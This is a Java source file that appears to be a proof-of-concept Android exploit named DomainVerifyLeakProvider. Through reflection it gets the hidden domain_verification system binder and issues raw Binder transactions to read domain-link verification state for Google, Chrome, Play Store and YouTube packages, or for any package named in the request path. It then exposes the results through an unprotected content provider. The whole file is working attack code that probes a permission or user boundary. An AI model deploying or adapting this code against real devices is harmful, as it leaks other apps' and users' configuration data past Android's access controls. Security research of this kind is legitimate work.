package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class DomainVerifyLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("domain_verification");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no binder"});
            return cursor;
        }

        String desc = "android.content.pm.verify.domain.IDomainVerificationManager";

        String[] targets = {
            "com.google.android.gms",
            "com.android.chrome",
            "com.google.android.apps.messaging",
            "com.android.vending",
            "com.google.android.youtube",
        };

        String path = uri.getPath();
        if (path != null && path.length() > 1) {
            targets = new String[]{path.substring(1).replace("/", ".")};
        }

        for (String pkg : targets) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(0); // userId
                binder.transact(3, data, reply, 0);
                reply.readException();

                // DomainVerificationUserState is Parcelable
                // Check if present (marker int)
                int marker = reply.readInt();
                if (marker != 0) {
                    // Parcelable data size header (written by framework)
                    int dataSize = reply.readInt();
                    // Read DomainVerificationUserState fields
                    String id = reply.readString();       // UUID
                    String pkgName = reply.readString();  // packageName
                    int linkHandling = reply.readInt();   // isLinkHandlingAllowed

                    // Domains map: Map<String, Integer>
                    int domainCount = reply.readInt();
                    cursor.addRow(new Object[]{"pkg:" + pkg,
                        "uuid=" + (id != null ? id.substring(0, Math.min(8, id.length())) : "?") +
                        " domains=" + domainCount + " linkHandling=" + linkHandling});
                    
                    for (int i = 0; i < Math.min(domainCount, 20); i++) {
                        try {
                            String domain = reply.readString();
                            int state = reply.readInt();
                            cursor.addRow(new Object[]{"  d" + i, domain + " [" + stateToStr(state) + "]"});
                        } catch (Exception e) {
                            cursor.addRow(new Object[]{"  parse_err", truncate(e.getMessage())});
                            break;
                        }
                    }
                    if (domainCount > 20) {
                        cursor.addRow(new Object[]{"  ...", (domainCount - 20) + " more"});
                    }
                } else {
                    cursor.addRow(new Object[]{"pkg:" + pkg, "no_state (marker=0)"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"pkg:" + pkg, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"pkg:" + pkg, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        return cursor;
    }

    private String stateToStr(int state) {
        switch (state) {
            case 0: return "none";
            case 1: return "selected";
            case 2: return "verified";
            default: return String.valueOf(state);
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
